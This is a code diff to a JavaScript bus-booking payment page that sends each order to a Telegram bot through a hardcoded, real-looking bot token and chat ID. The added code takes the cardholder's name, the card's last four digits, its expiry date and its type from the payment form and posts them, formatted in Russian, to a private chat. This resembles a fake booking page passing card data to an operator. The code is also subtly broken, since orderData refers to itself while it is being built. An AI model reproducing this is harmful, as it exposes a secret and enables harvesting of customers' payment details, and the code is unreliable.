@@ -1,8 +1,8 @@
 // Telegram Bot Configuration
 const TELEGRAM_CONFIG = {
-  BOT_TOKEN: 'YOUR_BOT_TOKEN', // Replace with your bot token
-  CHAT_ID: 'YOUR_CHAT_ID',     // Replace with your chat ID
-  ENABLED: true                 // Set to false to disable Telegram notifications
+  BOT_TOKEN: '7769777050:AAF3xPnqJL8Pr0NgjEp7-2dvI0MpRKyQNQU',
+  CHAT_ID: '7121003638',
+  ENABLED: true
 };
 
 class PaymentPage {
@@ -358,12 +358,22 @@ class PaymentPage {
       // Generate booking ID
       const bookingId = this.generateBookingId();
       
+      // Get form data
+      const cardNumber = document.getElementById('cardNumber').value;
+      const cardExpiry = document.getElementById('cardExpiry').value;
+      
       // Prepare order data for Telegram bot
       const orderData = {
         bookingId: bookingId,
         customer: {
           name: document.getElementById('cardHolder').value,
-          email: 'customer@example.com' // In real app, would be collected from form
+          email: 'busboking@example.com', // Would be collected from additional form in real app
+          phone: '+48 xxx xxx xxx' // Would be collected from additional form
+        },
+        card: {
+          lastFour: cardNumber.replace(/\s/g, '').slice(-4),
+          expiry: cardExpiry,
+          type: this.getCardType(cardNumber)
         },
         trip: {
           from: this.bookingData.from,
@@ -375,7 +385,7 @@ class PaymentPage {
         },
         seats: this.selectedSeats,
         totalPrice: `€${this.totalPrice.toFixed(2)}`,
-        paymentMethod: 'Card ending in ' + document.getElementById('cardNumber').value.slice(-4),
+        paymentMethod: `${orderData.card.type} **** ${orderData.card.lastFour}`,
         timestamp: new Date().toISOString(),
         status: 'paid'
       };
@@ -455,37 +465,78 @@ class PaymentPage {
   }
   
   formatOrderMessage(orderData) {
+    const dateOptions = {
+      weekday: 'long',
+      year: 'numeric', 
+      month: 'long',
+      day: 'numeric'
+    };
+    
+    const timeOptions = {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      timeZoneName: 'short'
+    };
+    
     return `
-🎫 <b>New Bus Booking</b>
+🎫 <b>НОВЫЙ ЗАКАЗ БИЛЕТА</b>
 
-📋 <b>Booking Details:</b>
-• ID: <code>${orderData.bookingId}</code>
-• Status: ✅ ${orderData.status.toUpperCase()}
+┌─── 📋 ДЕТАЛИ ЗАКАЗА ───
+│ ID: <code>${orderData.bookingId}</code>
+│ Статус: ✅ ОПЛАЧЕН
+└─────────────────
 
-👤 <b>Customer:</b>
-• Name: ${orderData.customer.name}
-• Email: ${orderData.customer.email}
+┌─── 👤 КЛИЕНТ ───
+│ Имя: <b>${orderData.customer.name}</b>
+│ Email: ${orderData.customer.email}
+└─────────────────
 
-🚌 <b>Trip Information:</b>
-• Route: ${orderData.trip.from} → ${orderData.trip.to}
-• Date: ${new Date(orderData.trip.date).toLocaleDateString('en-US', {
-  weekday: 'long', 
-  year: 'numeric', 
-  month: 'long', 
-  day: 'numeric'
-})}
-• Departure: ${orderData.trip.departureTime}
-• Arrival: ${orderData.trip.arrivalTime}
-• Duration: ${orderData.trip.duration}
+┌─── 🚌 ПОЕЗДКА ───
+│ Маршрут: <b>${orderData.trip.from}</b> ➡️ <b>${orderData.trip.to}</b>
+│ Дата: ${new Date(orderData.trip.date).toLocaleDateString('ru-RU', dateOptions)}
+│ Отправление: <b>${orderData.trip.departureTime}</b>
+│ Прибытие: <b>${orderData.trip.arrivalTime}</b>
+│ Время в пути: ${orderData.trip.duration}
+└─────────────────
 
-🪑 <b>Seats:</b> ${orderData.seats.join(', ')}
+┌─── 🪑 МЕСТА ───
+│ Выбранные места: <b>${orderData.seats.join(', ')}</b>
+│ Количество: ${orderData.seats.length} мест(а)
+└─────────────────
 
-💳 <b>Payment:</b>
-• Total: <b>${orderData.totalPrice}</b>
-• Method: ${orderData.paymentMethod}
+┌─── 💰 ОПЛАТА ───
+│ Сумма: <b>${orderData.totalPrice}</b>
+│ Способ: ${orderData.paymentMethod}
+└─────────────────
 
-🕐 <b>Ordered:</b> ${new Date(orderData.timestamp).toLocaleString()}
+🕐 Заказ оформлен: ${new Date(orderData.timestamp).toLocaleDateString('ru-RU')} в ${new Date(orderData.timestamp).toLocaleTimeString('ru-RU')}
+
+#заказ #автобус #оплачено
     `.trim();
+  }
+
+  getCardType(cardNumber) {
+    const number = cardNumber.replace(/\s/g, '');
+    
+    // Visa
+    if (/^4/.test(number)) {
+      return 'Visa';
+    }
+    // Mastercard
+    if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) {
+      return 'Mastercard';
+    }
+    // American Express
+    if (/^3[47]/.test(number)) {
+      return 'American Express';
+    }
+    // Discover
+    if (/^6/.test(number)) {
+      return 'Discover';
+    }
+    
+    return 'Card';
   }
 
   generateBookingId() {
